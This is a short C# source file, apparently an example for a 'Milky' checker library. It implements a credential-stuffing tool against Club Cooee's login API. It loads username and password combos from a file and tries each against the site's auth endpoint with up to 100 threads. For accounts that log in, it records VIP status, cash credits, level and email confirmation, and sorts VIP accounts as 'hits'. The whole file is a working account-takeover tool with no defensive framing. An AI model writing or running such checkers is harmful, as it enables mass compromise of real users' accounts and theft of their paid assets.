using Milky;
using Milky.Enums;
using Milky.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace Milky.Examples
{
    public static class Program
    {
        public static async Task Main()
        {
            var checkerSettings = new CheckerSettings(maxThreads: 100)
            {
                UseProxies = false,
                OutputDirectory = "Results",
                OutputInvalids = false
            };

            var checker = new CheckerBuilder(checkerSettings, Check)
                .WithCombos(File.ReadAllLines("combos.txt"))
                .Build();

            var consoleManager = new ConsoleManager(checker);
            _ = consoleManager.StartUpdatingTitleAsync(updateInterval: TimeSpan.FromMilliseconds(33), showFree: true, showPercentages: true, prefix: "Club Cooee Checker — ");
            _ = consoleManager.StartListeningKeysAsync(pauseKey: ConsoleKey.P, resumeKey: ConsoleKey.R, endKey: null);

            await checker.StartAsync();

            await Task.Delay(-1);
        }

        public static async Task<CheckResult> Check(Combo combo, HttpClient httpClient)
        {
            try
            {
                using var responseMessage = await httpClient.PostAsync("https://en.clubcooee.com/api3/auth_login", new FormUrlEncodedContent(new Dictionary<string, string>()
                {
                    { "username", combo.Username },
                    { "password", combo.Password }
                }));

                var responseString = await responseMessage.Content.ReadAsStringAsync();

                var responseJson = JsonSerializer.Deserialize<JsonElement>(responseString);

                if (responseJson.GetProperty("error").GetBoolean())
                {
                    return new CheckResult(ComboResult.Invalid);
                }

                var captures = new Dictionary<string, object>()
                {
                    { "Username", responseJson.GetProperty("name").GetString() },
                    { "VIP", responseJson.GetProperty("premium").GetBoolean() },
                    { "Cash", responseJson.GetProperty("credits").GetString() },
                    { "Level", responseJson.GetProperty("xp_level").GetInt16() },
                    { "Email confirmed", responseJson.GetProperty("email_confirmed").GetBoolean() }
                };

                return new CheckResult((bool)captures["VIP"] ? ComboResult.Hit : ComboResult.Free, captures);
            }
            catch
            {
                return new CheckResult(ComboResult.Retry);
            }
        }
    }
}
